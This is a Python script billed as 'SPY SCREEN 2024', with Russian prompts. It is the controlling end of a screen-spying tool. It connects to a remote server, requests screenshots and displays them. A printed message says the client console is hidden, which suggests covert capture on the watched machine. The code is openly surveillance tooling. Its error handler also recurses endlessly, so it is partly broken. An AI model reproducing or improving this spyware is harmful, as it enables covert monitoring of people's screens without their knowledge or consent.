import socket
import pyautogui
import pickle
import struct
from io import BytesIO
import time
import ctypes
import sys
from PIL import Image

def Update_screen():
    try:
        while True:
            x = input()
            if x=='0':
                print('Получаем скриншот...')
                receiver_socket.sendall(b' ')
                time.sleep(1)
                # Получение размера изображения
                message_size = 4
                data = b''
                while len(data) < message_size:
                    data += receiver_socket.recv(4096)
                # Извлечение размера изображения
                packed_msg_size = data[:message_size]
                data = data[message_size:]
                msg_size = int.from_bytes(packed_msg_size, byteorder='little')
    
                # Получение самого изображения
                while len(data) < msg_size:
                    data += receiver_socket.recv(4096)
    
                # Извлечение изображения
                frame_data = data[:msg_size]
                data = data[msg_size:]
    
                # Декодирование и отображение изображения
                img = Image.open(BytesIO(frame_data))
                img.show()
                print('Скриншот получен!\n')
            if x == '82':
                receiver_socket.sendall(b'0')
                receiver_socket.close()
                print('Соединение разорвано')
                return None
    finally:
        print('Системная ошибка')
        #client_socket.shutdown()
        #client_socket.close()
        Update_screen()

print('\n\nSPY SCREEN 2024 by RelictRaven & IPShow\n')
# Настройки
SERVER_IP = ''  # ip сервера
PORT = 22222           # Порт для соединения

print('Вы хотите подключится к серверу по умолчанию? Напиши да/нет затем Enter')
b = input()
if b == 'нет' or b == 'Нет' or b =='НЕТ' or b =='нЕТ' or b =='нЕт' or b =='n' or b =='N' or b =='no' or b =='No' or b == 'ytn' or b == 'Ytn':
    print('Введи IP сервера SPY SCREEN: ', end ="")
    SERVER_IP = input()
    print('Введи Порт сервера SPY SCREEN: ', end ="")
    PORT = int(input())  # Публичный IP-адрес сервера
else:
    print('подключение по умолчанию...')

print('\nПодключаемся к ' + SERVER_IP + ':' + str(PORT) + '...')

# Создание сокета
receiver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
receiver_socket.connect((SERVER_IP, PORT))
# receiver_socket.bind((SERVER_IP, PORT))
# receiver_socket.listen(1)
# print('Ожидание соединения...')
# conn, addr = receiver_socket.accept()
# print(f'Соединено с {addr}')
print('\nУспешное подключение к серверу, консоль клиента теперь скрыта')
print('\nДля получения снимка экрана нажмите 0, затем Enter')
print('Для разрыва соединения нажмите 82, затем Enter\n')
Update_screen()